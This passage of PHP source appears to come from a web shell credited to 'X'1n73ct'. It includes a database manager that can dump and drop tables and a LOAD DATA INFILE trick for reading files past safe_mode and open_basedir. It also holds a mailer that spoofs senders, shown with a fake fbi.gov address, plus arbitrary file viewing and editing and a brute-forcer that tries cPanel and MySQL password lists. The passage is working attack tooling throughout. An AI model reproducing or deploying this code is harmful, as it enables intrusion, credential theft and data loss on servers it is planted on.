  foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
  if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
  $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
elseif ($sql_tbl_insert_radio == 2) {
  $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
  $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
  $result = mysql_query($sql_query) or print(mysql_smarterror());
  $result = mysql_fetch_array($result, MYSQL_ASSOC);
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
  }
  if ($sql_x == "query") {
echo "<hr size=\"1\" noshade>";
if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
if ((!$submit) or ($sql_x)) { echo "<table class='tab'><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_x\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>"; }
  }
  if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;">
<b>Create new table:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newtbl">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_newtbl" size="20">
Fields: <input type="text" name="sql_field" size="3">
<input class="inputzbut" type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>Dump DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="dump">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="dump_file" size="30" value="dump_'.getenv("SERVER_NAME").'_'.$sql_db.'_'.date("d-m-Y-H-i-s").'.sql">
<input type="submit" class="inputzbut" name="submit" value="Dump">
</form>
</td>
</tr>
</table>';
if (!empty($sql_x)) { echo "<hr size=\"1\" noshade>"; }
if ($sql_x == "newtbl") {
  echo "<b>";
  if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
  }
  else { echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror(); }
}
elseif ($sql_x == "dump") {
  if (empty($submit)) {
$diplay = FALSE;
echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_x\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
$v = join (";",$dmptbls);
echo "<b>Only tables (explode \";\") :</b> <input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
if ($dump_file) {$tmp = $dump_file;}
else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
echo "<br><br><input class=\"inputzbut\" type=\"submit\" name=\"submit\" value=\"Dump\">";
echo "</form>";
  }
  else {
$diplay = TRUE; $set = array(); $set["sock"] = $sql_sock; $set["db"] = $sql_db; $dump_out = "download"; $set["print"] = 0;
$set["nl2br"] = 0; $set[""] = 0; $set["file"] = $dump_file; $set["add_drop"] = TRUE; $set["onlytabs"] = array();
if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
$ret = mysql_dump($set);
if ($sql_dump_download) {
  @ob_clean();
  header("Content-type: application/octet-stream");
  header("Content-length: ".strlen($ret));
  header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
  echo $ret;
  exit;
}
elseif ($sql_dump_savetofile) {
  $fp = fopen($sql_dump_file,"w");
  if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
  else {
fwrite($fp,$ret);
fclose($fp);
echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
  }
}
else {echo "<b>Dump: nothing to do!</b>";}
  }
}
if ($diplay) {
  if (!empty($sql_tbl)) {
  if (empty($sql_tbl_x)) {$sql_tbl_x = "browse";}
  $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
  $count_row = mysql_fetch_array($count);
  mysql_free_result($count);
  $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
$tbl_struct_fields = array();
while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
  if (@$sql_ls > @$sql_le) { $sql_le = $sql_ls + $perpage; }
  if (empty($sql_tbl_page)) { $sql_tbl_page = 0; }
  if (empty($sql_tbl_ls)) { $sql_tbl_ls = 0; }
  if (empty($sql_tbl_le)) { $sql_tbl_le = 30; }
  $perpage = $sql_tbl_le - $sql_tbl_ls;
  if (!is_numeric($perpage)) { $perpage = 10; }
  $numpages = $count_row[0]/$perpage;
  $e = explode(" ",$sql_order);
  if (count($e) == 2) {
if ($e[0] == "d") { $asc_desc = "DESC"; }
else { $asc_desc = "ASC"; }
$v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
  }
  else {$v = "";}
  $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
  $result = mysql_query($query) or print(mysql_smarterror());
  echo "<center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
  echo "<hr size=\"1\" noshade>";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=structure\">[<b> Structure </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=browse\">[<b> Browse </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_x=tbldump&thistbl=1\">[<b> Dump </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a> &nbsp; ";
  if ($sql_tbl_x == "structure") { echo "<b>Under construction!</b>"; }
  if ($sql_tbl_x == "insert") {
if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
if (!empty($sql_tbl_insert_radio)) { echo "<b>Under construction!</b>"; }
else {
  echo "<br><br><b>Inserting row into table:</b><br>";
  if (!empty($sql_tbl_insert_q)) {
$sql_query = "SELECT * FROM `".$sql_tbl."`";
$sql_query .= " WHERE".$sql_tbl_insert_q;
$sql_query .= " LIMIT 1;";
$result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
$values = mysql_fetch_assoc($result);
mysql_free_result($result);
  }
  else {$values = array();}
  echo "<form method=\"POST\"><table width=\"1%\" class='tub'><tr><th><b>Field</b></th><th><b>Type</b></th><th><b>Function</b></th><th><b>Value</b></th></tr>";
  foreach ($tbl_struct_fields as $field) {
$name = $field["Field"];
if (empty($sql_tbl_insert_q)) {$v = "";}
echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
$i++;
  }
  echo "</table><br>";
  echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
  if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
  echo "<br><br><input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form>";
}
  }
  if ($sql_tbl_x == "browse") {
$sql_tbl_ls = abs($sql_tbl_ls);
$sql_tbl_le = abs($sql_tbl_le);
echo "<hr size=\"1\" noshade>";
echo "<b>Page: </b>";
$b = 0;
for($i=0;$i<$numpages;$i++) {
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
  echo $i;
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
  if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
  else { echo " "; }
}
if ($i == 0) {echo "empty";}
echo "<br><br><form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"> <b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"> <input type=\"submit\" value=\"View\"></form>";
echo "<br><form method=\"POST\">\n";
echo "<table class='tub'><tr>";
echo "<th><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></th>";
for ($i=0;$i<mysql_num_fields($result);$i++) {
  $v = mysql_field_name($result,$i);
  if ($e[0] == "a") {$s = "d"; $m = "asc";}
  else {$s = "a"; $m = "desc";}
  echo "<th>";
  if (empty($e[0])) {$e[0] = "a";}
  if (@$e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
  else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."x=img&img=sort_".$m."\" alt=\"".$m."\"></a>";}
  echo "</th>";
}
echo "<th><font color=\"#00FF00\"><b>action</b></font></th>";
echo "</tr>";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
  echo "<tr>";
  $w = "";
  $i = 0;
  foreach ($row as $k=>$v) {
$name = mysql_field_name($result,$i);
$w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;
  }
  if (count($row) > 0) { $w = substr($w,0,strlen($w)-3); }
  echo "<td align='center' style='padding:0px;'><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
  $i = 0;
  foreach ($row as $k=>$v) {
$v = htmlspecialchars($v);
if ($v == "") { $v = "<font color=\"#00FF00\">NULL</font>"; }
echo "<td>".$v."</td>";
$i++;
  }
  echo "<td>";
  echo "<a href=\"".$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a>";
  echo "&nbsp;|&nbsp;";
  echo "<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";
  echo "</td>";
  echo "</tr>";
}
mysql_free_result($result);
echo "</table><hr size=\"1\" noshade><p align=\"left\"><input type=\"checkbox\"/> <select name=\"sql_x\">";
echo "<option value=\"\">With selected:</option>";
echo "<option value=\"deleterow\">Delete</option>";
echo "</select> <input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form></p>";
}
 }
 else {
$result = mysql_query("SHOW TABLE STATUS", $sql_sock);
if (!$result) { echo mysql_smarterror(); }
else {
echo '<form method="POST">
<table class="tub">
<tr><th><input type="checkbox" name="boxtbl_all" value="1"></th><th>Table</th><th>Rows</th><th>Engine</th><th>Created</th><th>Modified</th><th>Size</th><th>Action</th></tr>';
 $i = 0;
 $tsize = $trows = 0;
 while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
$tsize += $row["Data_length"];
$trows += $row["Rows"];
$size = view_size($row["Data_length"]);
echo'<tr>
<td align="center" style="padding:0px;"><input type="checkbox" name="boxtbl[]" value="'.$row["Name"].'"></td>
<td><a href="'.$sql_surl.'sql_tbl='.urlencode($row["Name"]).'"><b>'.$row["Name"].'</b></a></td>
<td>'.$row["Rows"].'</td><td>'.$row["Engine"].'</td><td>'.$row["Create_time"].'</td><td>'.$row["Update_time"].'</td><td>'.$size.'</td>
<td><a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DELETE FROM `".$row["Name"]."`").'">Empty</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DROP TABLE `".$row["Name"]."`").'">Drop</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_tbl_x=insert&sql_tbl='.$row["Name"].'">Insert</a></td>
</tr>';
$i++;
 }
 echo "\t\t<tr>\n".
"\t\t<th>+</th><th>$i table(s)</th><th>$trows</th><th>$row[1]</th><th>$row[10]</th><th>$row[11]</th><th>".view_size($tsize)."</th><th></th>\n";
echo'</tr>
</table>
<div align="right">
<select class="inputz" name="sql_x">
<option value="">With selected:</option>
<option value="tbldrop">Drop</option>
<option value="tblempty">Empty</option>";
<option value="tbldump">Dump</option>";
<option value="tblcheck">Check table</option>";
<option value="tbloptimize">Optimize table</option>";
<option value="tblrepair">Repair table</option>";
<option value="tblanalyze">Analyze table</option>";
</select>
<input class="inputzbut" type="submit" value="Confirm">
</div>
</form>';
 mysql_free_result($result);
}
 }
}
 }
}
else {
$xs = array("","newdb","serverstatus","servervars","processes","getfile");
if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;"><b>Create new DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newdb">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_newdb" size="20">
<input class="inputzbut"  type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>View File:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="getfile">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_getfile" size="30" value="'.htmlspecialchars($sql_getfile).'">
<input class="inputzbut" type="submit" value="Get">
</form>
</td>
</tr>
</table>';
}
if (!empty($sql_x)) {
 echo "<hr size=\"1\" noshade>";
 if ($sql_x == "newdb") {
echo "<b>";
if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
 }
 if ($sql_x == "serverstatus") {
$result = mysql_query("SHOW STATUS", $sql_sock);
echo "<center><b>Server status variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table></center>";
mysql_free_result($result);
 }
 if ($sql_x == "servervars") {
$result = mysql_query("SHOW VARIABLES", $sql_sock);
echo "<center><b>Server variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "processes") {
if (!empty($kill)) {
 $query = "KILL ".$kill.";";
 $result = mysql_query($query, $sql_sock);
 echo "<b>Process #".$kill." was killed.</b>";
}
$result = mysql_query("SHOW PROCESSLIST", $sql_sock);
echo "<center><b>Processes:</b><br><br>";
echo "<table class='tub'><th><b>ID</b></th><th><b>USER</b></th><th><b>HOST</b></th><th><b>DB</b></th><th><b>COMMAND</b></th><th><b>TIME</b></th><th><b>STATE</b></th><th><b>INFO</b></th><th><b>Action</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_x=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "getfile") {
$tmpdb = $sql_login."_tmpdb";
$select = mysql_select_db($tmpdb);
if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
if ($select) {
 $created = FALSE;
 mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
 mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
 $result = mysql_query("SELECT * FROM tmp_file;");
 if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
 else {
for ($i=0;$i<mysql_num_fields($result);$i++) { $name = mysql_field_name($result,$i); }
$f = "";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) { $f .= join ("\r\n",$row); }
if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
mysql_free_result($result);
mysql_query("DROP TABLE tmp_file;");
 }
}
mysql_drop_db($tmpdb);
 }
}
 }
}
echo '</td></tr>';
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)) { $affected = 0; }
  echo "\t<tr><th colspan=2>Affected rows: $affected</th></tr>";
}
echo '</table></center>';
  }
echo '</form>';
}
}
//*--------------------------------[ batas ]--------------------------------*//

elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){@ini_set('output_buffering',0); 
if(isset($_POST['mail_send'])){
	$mail_to = $_POST['mail_to'];
	$mail_from = $_POST['mail_from'];
	$mail_subject = $_POST['mail_subject'];
	$mail_content = magicboom($_POST['mail_content']);
	if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
		$msg = "email sent to $mail_to";
	}
	else $msg = "send email failed";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="X-1n73ct@fbi.gov" name="mail_from" />&nbsp; from</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr>
<tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>

<?php }


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){ @ini_set('output_buffering',0); 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	if(!isset($file)) $file = magicboom($_GET['view']);
	if(!$win && $posix){
		$name=@posix_getpwuid(@fileowner($folder));
		$group=@posix_getgrgid(@filegroup($folder));
		$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
	}
	else {
		$owner = $user;
	}
	$filn = basename($file);
	echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr>
	</table>
	";
	if(isset($_GET['type']) && ($_GET['type']=='image')){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
	}
	elseif(isset($_GET['type']) && ($_GET['type']=='code')){
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
	}
	else {
		echo "<div class=\"viewfile\">";
		echo nl2br(htmlentities((@file_get_contents($file))));
		echo "</div>";
	}
  }
  elseif(is_dir($_GET['view'])){
		echo showdir($pwd,$prompt);
  }
	
}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){@ini_set('output_buffering',0); 

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['edit'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	
?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'logout'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=logout" method="post">

<?php
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo "<br /><br /><center>Byee !!!!!!</center>"; 
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{	@ini_set('output_buffering',0); 
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
			<?php
			//bruteforce
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Recoded By X'1n73ct
*/
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "BruteForce CPanel by X'1n73ct ~ user is (<b><font style='color:#ff0000'>$user</font></b>) Password is (<b><font style='color:#ff0000'>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found [<font style='color:#ff0000'> $ok </font>] Cpanel by X'1n73ct</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
